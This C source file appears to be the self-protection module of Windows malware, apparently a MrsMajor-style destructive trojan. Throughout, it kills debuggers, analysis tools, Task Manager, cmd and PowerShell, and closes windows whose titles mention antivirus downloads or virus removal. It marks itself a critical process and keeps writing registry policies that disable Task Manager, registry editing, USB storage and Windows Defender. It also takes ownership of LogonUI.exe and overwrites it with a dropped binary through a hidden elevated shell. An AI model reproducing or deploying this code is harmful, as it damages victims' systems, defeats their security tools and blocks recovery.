#include "MM3.h"

CHAR* criticalwindlist[] = {
	"proxycap",
	"proxifier",
	"fiddler",
	"wireshark",
	"dnspy",
	"process hacker",
	"megadumper",
	"ollydbg",
	"softperfect",
	"httpdebugger",
	"ilspy",
	"de4dot",
	"decompiler",
	"group policy",
	"nofuser",
	"dependency walker",
	"dotpeek",
	"process monitor",
	"resource monitor",
	"antivirus download",
	"rootabx",
	"mrsmajor virus",
	"disinfect virus",
	"mrsmajor removal",
	"eset download",
	"malwarebytes download",
	"av download",
	"kill me senpai",
	"security policy",
	"control panel"
};
INT criticalwindlist_count = sizeof(criticalwindlist) / sizeof(criticalwindlist[0]);

CHAR* proclist[] = {
	"memz.exe",
	"taskmgr.exe",
	"regedit.exe",
	"mrsmjrgui.exe",
	"cmd.exe",
	"taskkill.exe",
	"powershell.exe",
	"resmon.exe",
	"mmc.exe",
	"wscript.exe"
};
INT proclist_count = sizeof(proclist) / sizeof(proclist[0]);

static INT werekilling = 1;

VOID WINAPI selfdefend(VOID)
{
	while (TRUE)
	{
		SetProcessCritical();
		Sleep(5000);
	}
}

VOID WINAPI to_lower(CHAR* str) {
	for (; *str; ++str) *str = (CHAR)tolower((BYTE)*str);
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	CHAR windowTitle[MAX_STR] = { 0 };
	GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
	to_lower(windowTitle);

	DWORD pid = 0;
	GetWindowThreadProcessId(hwnd, &pid);
	if (pid == 0) return TRUE;

	CHAR processName[MAX_STR] = { 0 };
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe)) {
			do {
				if (pe.th32ProcessID == pid) {
					strcpy_s(processName, sizeof(processName), pe.szExeFile);
					break;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}
	to_lower(processName);

	for (INT r = 0; r < criticalwindlist_count; r++) {
		if (strstr(windowTitle, criticalwindlist[r]) != NULL) {
			if (werekilling == 1) {
				werekilling = 0;

				LaunchTaskkill();

				Sleep(4000);
				werekilling = 1;
			}
		}
	}

	if (strcmp(windowTitle, "charles") == 0 && strcmp(processName, "charles.exe") == 0) {
		if (werekilling == 1) {
			KillProcessByID(pid);
		}
	}

	for (INT r = 0; r < proclist_count; r++) {
		if (strstr(processName, proclist[r]) != NULL) {
			if (werekilling == 1) {
				KillProcessByID(pid);
			}
		}
	}

	return TRUE;
}

BOOL CALLBACK TaskkillEnumProc(HWND hwnd, LPARAM lParam) {
	if (!IsWindowVisible(hwnd)) {
		return TRUE;
	}

	CHAR caption[MAX_STR] = { 0 };

	INT length = GetWindowTextA(hwnd, caption, sizeof(caption));

	if (length > 1) {
		to_lower(caption);

		if (strstr(caption, "winbase_base_procid_none") != NULL) {
			if (werekilling == 1) {
				ExitProcess(0);
			}
		}
	}

	return TRUE;
}

VOID WINAPI winprockill(VOID)
{
	while (TRUE)
	{
		EnumWindows(EnumWindowsProc, 0);
		Sleep(1);
	}
}

VOID WINAPI taskkill(VOID)
{
	while (TRUE)
	{
		EnumWindows(TaskkillEnumProc, 0);
		Sleep(100);
	}
}

VOID WINAPI regdefend(VOID)
{
	while (TRUE)
	{
		// 壁紙変更の禁止
		SetRegistryDword(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop", "NoChangingWallPaper", 1);

		// タスクマネージャーの無効化
		SetRegistryDword(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);

		// レジストリ編集ツールの無効化
		SetRegistryDword(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);

		//「ファイル名を指定して実行」の禁止
		SetRegistryDword(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", 1);

		// Windowsキーショートカットの無効化
		SetRegistryDword(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoWinKeys", 1);

		// USBストレージの無効化
		SetRegistryDword(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", 4);

		// Windows Defenderの無効化
		SetRegistryDword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1);

		// Cursors: カーソル画像の変更
		CONST CHAR* cursorPath = "C:\\Windows\\winbase_base_procid_none\\secureloc0x65\\rcur.cur";
		SetRegistryString(HKEY_CURRENT_USER, "Control Panel\\Cursors", "Arrow", cursorPath);
		SetRegistryString(HKEY_CURRENT_USER, "Control Panel\\Cursors", "AppStarting", cursorPath);
		SetRegistryString(HKEY_CURRENT_USER, "Control Panel\\Cursors", "Hand", cursorPath);

		Sleep(10);
	}
}

VOID WINAPI logonuiOWR(VOID)
{
	HANDLE hFile = CreateFileA(
		"C:\\Windows\\WinAttr.gci",
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	werekilling = 0;

	Sleep(1000);

	CHAR cmd[MAX_STR] = "/c C:\\windows\\system32\\takeown.exe /F C:\\windows\\system32\\LogonUI.exe && C:\\windows\\system32\\icacls.exe \"C:\\windows\\system32\\LogonUI.exe\" /granted \"%username%\":F && copy \"C:\\windows\\winbase_base_procid_none\\secureloc0x65\\ui66.exe\" \"C:\\windows\\system32\\LogonUI.exe\" /Y";

	if (Wow64EnableWow64FsRedirection(FALSE))
	{
		ShellExecuteA(NULL, "runas", "cmd.exe", cmd, NULL, SW_HIDE);
	}
	if (!Wow64EnableWow64FsRedirection(TRUE))
	{
		ShellExecuteA(NULL, "runas", "cmd.exe", cmd, NULL, SW_HIDE);
	}
	Sleep(10000);
	ExitProcess(0);
}

INT WINAPI protection64(VOID)
{
	werekilling = 1;
	//EnterDebugMode();

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)selfdefend, NULL, 0, NULL);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)winprockill, NULL, 0, NULL);

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)taskkill, NULL, 0, NULL);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)regdefend, NULL, 0, NULL);

	while (TRUE);
}